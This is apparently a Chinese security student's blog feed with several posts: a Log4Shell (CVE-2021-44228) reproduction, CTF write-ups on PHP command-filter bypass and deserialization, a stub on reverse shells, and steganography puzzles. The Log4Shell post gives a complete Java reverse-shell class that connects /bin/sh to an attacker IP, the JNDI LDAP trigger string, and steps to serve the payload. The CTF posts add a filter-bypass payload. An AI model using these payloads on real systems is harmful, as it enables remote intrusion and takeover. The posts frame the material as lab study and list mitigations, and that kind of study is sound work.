      <title>CVE-2021-44228 log4RCE漏洞复现</title>
      <link href="/2023/11/03/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%AE%E5%85%BB/CVE-2021-44228%20log4jRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/11/03/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%AE%E5%85%BB/CVE-2021-44228%20log4jRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言（一些要知道的知识）"><a href="#前言（一些要知道的知识）" class="headerlink" title="前言（一些要知道的知识）"></a>前言（一些要知道的知识）</h1><h5 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h5><p>这个东东是以一个日志框架，很多日志都是它搭的</p><p><code>Log4j</code> 是 <code>Apache</code> 的一个开源项目，通过使用 <code>Log4j</code>，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是socket服务器、NT的事件记录器、<code>UNIX Syslog</code>守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。</p><h5 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h5><p><code>Apache Log4j2</code> 是对 <code>Log4j</code> 的升级，它比其前身 <code>Log4j 1.x</code> 提供了重大改进，并提供了 <code>Logback</code> 中可用的许多改进，同时修复了 <code>Logback</code> 架构中的一些固有问题。</p><p>2021年12月9日，国内多家机构监测到Apache log4j2存在任意代码执行漏洞，并紧急通报相关情况。由于 <code>Apache Log4j2</code> 某些功能存在递归解析问题，攻击者可直接构造恶意请求，触发远程代码执行漏洞。<strong>CVE编号: CVE-2021-44228</strong></p><p>漏洞适用版本为 <code>2.0 &lt;= Apache log4j2 &lt;= 2.14.1</code>，只需检测Java应用是否引入 <code>log4j-api</code> , <code>log4j-core</code> 两个jar包。若有应用使用这两个jar包，则有很大可能会受到影响。</p><h5 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h5><p><code>JNDI(Java Naming and Directory Interface)</code>是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。JNDI客户端可以通过一个简单的字符串进行资源查找。如果这个资源的来源不可信，那么可能会导致远程代码执行的问题。</p><p>也就是说的jndi中会直接调用lookup()导致任意代码执行漏洞</p><p>jndi 在 jdk 里面支持以下四种服务</p><ul><li>LDAP：轻量级目录访问协议</li><li>通用对象请求代理架构(CORBA)；通用对象服务(COS)名称服务</li><li>Java 远程方法调用(RMI) 注册表</li><li>DNS 服务</li></ul><p>前三种都是字符串对应对象，DNS 是 IP 对应域名。</p><h5 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h5><p><code>LDAP</code> 的全称是 <code>Lightweight Directory Access Protocol</code>，（轻量目录访问协议）。LDAP约定了 <code>Client</code> 与 <code>Server</code> 之间的信息交互格式、使用的端口号、认证方式等内容。而 LDAP 协议的实现，有着众多版本，例如微软的 <code>Active Directory</code> 是 <code>LDAP</code> 在 <code>Windows</code> 上的实现，AD 实现了 <code>LDAP</code> 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。</p><p>当<code>log4j</code>打印的日志内容中包含<code>$&#123;jndi:ldap://x.x.x.x&#125;</code>时，程序会通过<code>LDAP</code>协议访问<code>x.x.x.x</code>这个地址，<code>x.x.x.x</code>会返回一个指向<code>class</code>文件的地址，程序会通过返回的地址下载<code>class</code>文件并执行。</p><h5 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h5><p>Java远程方法调用，也就是Java RMI，它是一种机制，允许一个Java虚拟机中的对象去访问和调用另一个Java虚拟机中包含的方法。这与RPC基本相同，但是在面向对象的范例中，而非面向过程，它允许不在同一个地址空间中的Java程序互相通信。</p><h1 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h1><p><img src="file:///C:/Users/WangTao/Pictures/Typedown/407d6d30-0655-4b77-893e-d4352c29e181.png" alt="407d6d30-0655-4b77-893e-d4352c29e181"></p><p>现在就已经得到了shell了。我还没发力就得到了shell</p><h1 id="理论分析"><a href="#理论分析" class="headerlink" title="理论分析"></a>理论分析</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞也就是log4j2框架下的lookup查询服务提供了{}字段解析功能，这可以让查询指向任何服务，再结合JNDI注入，使得靶机请求远程服务来连接本地对象。我们在lookup里的{}中构造payload，调用JNDI服务（LDAP）向攻击机部署的站点获取恶意的.class对象，造成远程代码执行。用反弹shell到自己的端口</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Log4j 2.x &lt;&#x3D; 2.14.1</p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>既然谈到log4j2漏洞成因依靠JNDI注入的成功，，我们就来学习学习</p><p>我们在前面已经说过了，是一个查找的接口，会针对一个哪怕字符串进行查询操作。</p><p>而正如前面所说JNDI如果不经过滤就直接执行查询操作极有可能会产生漏洞。他可以结合RMI，LDAP，CORBA实现注入，但是这篇不多说，挖个坑先</p><p> [ ] INDI的注入方法</p><h1 id="漏洞用途"><a href="#漏洞用途" class="headerlink" title="漏洞用途"></a>漏洞用途</h1><ul><li><p>获取shell</p></li><li><p>获得重要信息</p></li></ul><p>那么我们要如何实现呢？</p><p>根据前面的说法，我们可以总结一下：发现漏洞 -&gt;  创建反弹shell payload，编译生成class文件 -&gt; 启动服务（我们的服务包括http服务以及ldap服务） -&gt; 构造payload触发服务</p><h3 id="判断漏洞"><a href="#判断漏洞" class="headerlink" title="判断漏洞"></a>判断漏洞</h3><p>判断这个漏洞的关键在于会不会访问攻击机，那么我们本机监听一个端口，然后触发界面输入</p><p><code>$&#123;jndi:ldap://ip:port&#125;</code></p><p>解释：使用jndi这个API，使用LDAP协议访问这个ip:port</p><p>我们这里获取shell，就构造一个反弹shell payload</p><p>关于反弹shell的操作我们在另一个博客中会细谈，这里直接上payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    String host=<span class="string">&quot;10.1.1.143&quot;</span>;</span><br><span class="line">    <span class="type">int</span> port=<span class="number">999</span>;</span><br><span class="line">    String cmd=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    Process p=<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).redirectErrorStream(<span class="literal">true</span>).start();</span><br><span class="line">    Socket s=<span class="keyword">new</span> <span class="title class_">Socket</span>(host,port);</span><br><span class="line">    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();</span><br><span class="line">    OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">    <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">      <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)</span><br><span class="line">        so.write(pi.read());</span><br><span class="line">      <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)</span><br><span class="line">        so.write(pe.read());</span><br><span class="line">      <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)</span><br><span class="line">        po.write(si.read());</span><br><span class="line">      so.flush();</span><br><span class="line">      po.flush();</span><br><span class="line">      Thread.sleep(<span class="number">50</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        p.exitValue();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    p.destroy();</span><br><span class="line">    s.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>编译得到.class文件</p><p>而后我们可以注意到我们发送payload之后，他会访问我们的ip:port，然后获取相应的class文件。所以我们因该部署一个http服务，并托管这个class文件。</p><p>我们可以用python部署http服务</p><p><code>python3 -m http.server 80</code></p><p>部署完这个服务，但是我们的class文件还是没有部署上去，而且这个漏洞是通过LDAP协议过来找class文件的，所以我们这里也因该用相同的协议，部署相同的服务</p><p>接着我们要搭建ldap服务，把文件部署上去</p><p>接着触发漏洞就能实现就收反弹shell</p><h3 id="意外之财"><a href="#意外之财" class="headerlink" title="意外之财"></a>意外之财</h3><p>我本来以为这个port无关紧要，所以这次第二次复现我监听的是1388端口，但是部署的时候我发现LDAP协议部署之后默认的1389端口。于是我们要么改jar包，要么改payload。那肯定改payload</p><p>其次发现payload</p><p><code>$&#123;jndi:ldap://10.1.1.200:1389/a&#125;</code>这里最后要加上一个<code>a</code>(或者是其他字符)。不然是不会得到shell的</p><h2 id="代码层漏洞分析"><a href="#代码层漏洞分析" class="headerlink" title="代码层漏洞分析"></a>代码层漏洞分析</h2><p>漏洞触发点在 <code>Logger</code> 的 <code>debug、info、warn、error、fatal</code> 方法</p><p><img src="https://www.hetianlab.com/headImg.action?guideImg=97d65b70-56c9-4c79-9186-d443af4844a8.png" alt="image.png"></p><p>这些方法都会调用 <code>logIfEnabled</code> 方法</p><p><img src="https://www.hetianlab.com/headImg.action?guideImg=c50c93f3-c364-4b78-bc6a-74c893429f39.png" alt="image.png"></p><p>从 <code>logIfEnabled</code> 层层跟入，到达 <code>MessagePatternConverter</code> 类的 <code>format</code> 方法，在这个方法内部，会先判断 <code>this.config != null &amp;&amp; !this.noLookups</code> 的值是否为真，其中 <code>this.noLookups</code> 的值来自于 <code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</code>，<code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</code> 的值又来自于 <code>JVM</code> 参数 <code>log4j2.formatMsgNoLookups</code> 的值，相关代码如下：<br>    this.noLookups &#x3D; Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;&#x3D; 0;<br>    ···<br>    public static final boolean FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS &#x3D; PropertiesUtil.getProperties().getBooleanProperty(“log4j2.formatMsgNoLookups”, false);</p><p>所以只要 <code>JVM</code> 参数中 <code>log4j2.formatMsgNoLookups==True</code> ，漏洞利用就无法成功。</p><p>之后的代码会判断要打印的日志字符串 <code>workingBuilder</code> 中是否包含连续的两个字符 <code>$</code> 和 <code>&#123;</code> 。如果存在，就将 <code>$&#123;xxx&#125;</code> 这段字符提取出来，传入 <code>StrSubstitutor</code> 类的 <code>replace</code> 方法：</p><p><img src="https://www.hetianlab.com/headImg.action?guideImg=173301ec-54cf-4eed-8d96-58d0e8484253.png" alt="image.png"></p><p>最后传入 <code>substitute</code> 方法中。<code>substitute</code> 会调用 <code>resolveVariable</code> 方法：</p><p><img src="https://www.hetianlab.com/headImg.action?guideImg=91dab1bd-99fa-4dfa-9991-1f6bdacef3ee.png" alt="image.png"></p><p><code>resolveVariable</code> 方法中会进行 <code>resolver.lookup</code> 查询：</p><p><img src="https://www.hetianlab.com/headImg.action?guideImg=2129f2da-dd17-49b7-8540-e218cacbdd5f.png" alt="image.png"></p><p><img src="https://www.hetianlab.com/headImg.action?guideImg=559abf18-3a22-4295-9a74-56931b50bbdf.png" alt="image.png"></p><p>最后会进入 <code>JndiLookup.lookup</code> 方法进行 <code>jndi</code> 查询，查询的参数就是<code>ldap://127.0.0.1:1389/a</code></p><p><img src="https://www.hetianlab.com/headImg.action?guideImg=da8fdaf9-576d-47e7-9dec-991a9b84a821.png" alt="image.png"></p><p>这个部分就先简单一抄，以后复现在来分析分析</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li><p>升级</p></li><li><p>设置<code>JVM</code>启动参数 <code>-Dlog4j2.formatMsgNoLookups=true</code></p></li><li><p>过滤<code>$&#123;</code>字符串</p></li><li><p>限制访问外网</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>弱类型（rce）绕过+反序列化</title>
      <link href="/2023/10/31/%E6%AF%8F%E5%A4%A9%E4%B8%A4%E9%A2%98/day7/"/>
      <url>/2023/10/31/%E6%AF%8F%E5%A4%A9%E4%B8%A4%E9%A2%98/day7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="rce弱类型"><a href="#rce弱类型" class="headerlink" title="rce弱类型"></a>rce弱类型</h2><p>之前做的shctf的题，现在拿来复盘复盘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|les|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关键：我们要执行得到flag的语句，首先输入ls可以看到flag就在这个目录</p><p>注：这里题目可以有变式，对不同的系统显示的语句是不一样的。linux用ls，Windows就是dir</p><p><img src="file:///C:/Users/WangTao/Pictures/Typedown/1161a5bb-a521-445d-a1ab-e5ae530af956.png" alt="1161a5bb-a521-445d-a1ab-e5ae530af956"></p><p>其次是我们如何实现查看这个文件</p><p>我们这里列出来一些可以实现查看这个功能的函数</p><ul><li><p>cat</p></li><li><p>tac</p></li><li><p>more</p></li><li><p>less</p></li><li><p>head</p></li><li><p>tail</p></li><li><p>nl</p></li><li><p>tail</p></li><li><p>vi</p></li><li><p>vim</p></li><li><p>sort</p></li><li><p>uniq</p></li></ul><p>乍一看就只剩uniq能用了，但是由于空格被过滤了我们还要绕过它</p><p>常见空格绕过方式</p><ul><li><p>${IFS}，变式$IFS$9</p></li><li><p>&lt;&gt;或者&lt;</p></li><li><p>%09（这个需要php环境）</p></li></ul><p>解决这个问题了，我们现在解决flag过滤问题</p><p>本来当初想的是加\（转义）符，但是死活注不出来，直接不理解了。</p><p>看了眼wp要用通配符：）</p><p>payload:<code>uniq$&#123;IFS&#125;f???</code></p><p>讲一下原理</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var_1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;var_1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$q</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;q)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;           </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$z</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;z-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>乍一看有一个文件包含漏洞，那么我们就要想办法到达那一步</p><p>当把A当作函数调用时会触发，-》D，get调用的成员不存在-》C，当把C当作字符串使用时调用，-&gt;preg_match的第二个参数应该是一个数组对象</p><p>构造pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> C;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> D;</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="variable">$q</span>=<span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>脚本小子第二天--反弹shell操作</title>
      <link href="/2023/10/28/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%AE%E5%85%BB/Windows%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2023/10/28/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%AE%E5%85%BB/Windows%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家都知道反弹shell是内网渗透的第一步，也是外网渗透的最后一步。本篇文章主要讲解反弹shell的原理，加之反弹shell之后可执行的操作。加之自己搜寻的资料，查询的东东。</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="什么是反弹shell？"><a href="#什么是反弹shell？" class="headerlink" title="什么是反弹shell？"></a>什么是反弹shell？</h2><p>名词解释：</p><ul><li><p>shell：壳，简单来说就是系统执行系统，就像cmd一样</p></li><li><p>反弹shell：就是攻击机监听在某个TCP&#x2F;UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p></li></ul><p>为什么要搞反弹shell呢？</p><p>要知道这个问题我们就要知道两种连接方式</p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>就是攻击机主动的连接受害机，</p><h2 id="如何实现"><a href="#如何实现" class="headerlink" title="如何实现"></a>如何实现</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>day3，空格+制表编码，</title>
      <link href="/2023/10/26/%E6%AF%8F%E5%A4%A9%E4%B8%A4%E9%A2%98/day3/"/>
      <url>/2023/10/26/%E6%AF%8F%E5%A4%A9%E4%B8%A4%E9%A2%98/day3/</url>
      
        <content type="html"><![CDATA[<h1 id="空格-制表编码"><a href="#空格-制表编码" class="headerlink" title="空格+制表编码"></a>空格+制表编码</h1><p>位置：攻防世界 A-Weird-C-Program</p><p>拿到题目看到是一个C语言文件，很怪。但是直接运行，发现报错引入的头文件不对。花了一些时间修复（我还以为是修复的题）</p><p><img src="file:///C:/Users/WangTao/Pictures/Typedown/7ea69619-e6a0-45b0-b1cc-e9e10b8f0881.png" alt="7ea69619-e6a0-45b0-b1cc-e9e10b8f0881"></p><p>找到的信息是这些是在Linux中运行时用的头文件写法，但是放到kali中也跑不起来。只好再仔细康康</p><p><img src="file:///C:/Users/WangTao/Pictures/Typedown/f6a2b9eb-cc67-405b-a4c0-bb8ae8959693.png" alt="f6a2b9eb-cc67-405b-a4c0-bb8ae8959693"></p><p>有这样一段，洋文不好的我看到<code>没什么东西是完美的，他只要带上一个好眼睛去发现隐藏的缺陷</code></p><p>说明存在隐藏信息。结合这个间距十分奇怪就能想到不知道多久前做的空格编码。</p><p>全选发现</p><p><img src="file:///C:/Users/WangTao/Pictures/Typedown/e0a6ffe1-f903-4eea-9bb3-504a7b8dfa6a.png" alt="e0a6ffe1-f903-4eea-9bb3-504a7b8dfa6a"></p><p>间隔是空格和制表符，因为有一些题就是用空白符隐藏信息，两种就可能是二进制编码</p><p>写个脚本爆（空格为0，制表为1）</p><p>通过计算发现每个关键信息点应该是12个位？？</p><p>为什么嘞？？</p><p>于是又到了反推的时候，已知我们要的东东是flag，它对应的ASCII码是102 108 97 103</p><p>1100110 1101100 1100001 1100111</p><p><img src="file:///C:/Users/WangTao/Pictures/Typedown/e4aad700-8fb9-4971-a208-e369691e02b4.png" alt="e4aad700-8fb9-4971-a208-e369691e02b4"></p><p>一眼ASCII码，上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#初识脚本，写的会细一点</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;code.cpp&#x27;</span>) <span class="keyword">as</span> aaa:</span><br><span class="line">    <span class="built_in">sum</span> = []</span><br><span class="line">    <span class="keyword">for</span> aa <span class="keyword">in</span> aaa:</span><br><span class="line">        s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> aa:</span><br><span class="line">            <span class="keyword">if</span> a == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                s += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> a == <span class="string">&#x27;\t&#x27;</span>:</span><br><span class="line">                s += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(s) &gt;= <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">sum</span>.append(s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line">    <span class="keyword">for</span> ss <span class="keyword">in</span> <span class="built_in">sum</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(ss,<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">int</span>(ss,<span class="number">2</span>)会将二进制字符串转化为一个整数</span><br><span class="line"><span class="built_in">chr</span>()函数能见这个整数转化为对应的ASCII码</span><br><span class="line">end=<span class="string">&#x27;&#x27;</span>保证不换行</span><br></pre></td></tr></table></figure><h1 id="sql注入：导论四道题"><a href="#sql注入：导论四道题" class="headerlink" title="sql注入：导论四道题"></a>sql注入：导论四道题</h1><p>放另一个文件了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一个水赛——盲水印+wireshark蓝牙包分析</title>
      <link href="/2023/10/25/%E6%AF%8F%E5%A4%A9%E4%B8%A4%E9%A2%98/day2/"/>
      <url>/2023/10/25/%E6%AF%8F%E5%A4%A9%E4%B8%A4%E9%A2%98/day2/</url>
      
        <content type="html"><![CDATA[<h1 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h1><p>盲水印可分为两种：LSB盲水印和傅里叶变化盲水印。</p><p>前者使用的原理是最小位藏信息。我们可以使用静谧之眼以及stegsolve解决这个事情。</p><p>而傅里叶变化水印可以使用一系列工具或python脚本解决。</p><p><a href="https://juejin.cn/post/7272843829555249193">【Web数据安全】前端水印技术全解析之不可见水印（盲水印） - 掘金 (juejin.cn)</a></p><p>推荐一篇好文</p><p><a href="https://zhuanlan.zhihu.com/p/19763358">傅里叶分析之掐死教程（完整版）更新于2014.06.06 - 知乎 (zhihu.com)</a></p><p>深入理解傅里叶分析：），解决盲水印变换</p><p>回归正题，首先我们拿到题目可以看到</p><p>给了一个没有后缀的witer文件</p><p><img src="file:///C:/Users/WangTao/Pictures/Typedown/b7acc49a-ff85-44b9-a482-cf52f506673b.png" alt="b7acc49a-ff85-44b9-a482-cf52f506673b"></p><p>结合题目告诉是盲水印就知道要改后缀，但是是什么文件还要看看文件头</p><p><img src="file:///C:/Users/WangTao/Pictures/Typedown/bd146602-c9a5-4c27-b1b3-37ed752916f0.png" alt="bd146602-c9a5-4c27-b1b3-37ed752916f0"></p><p>拿到，很快啊。可以知道0D 0A 1A 0A 似曾相识，不错他就是png图片文件头的后八位，那么</p><p><img src="file:///C:/Users/WangTao/Pictures/Typedown/570f9044-57e8-4a09-b2e7-3c102d8bfd99.png" 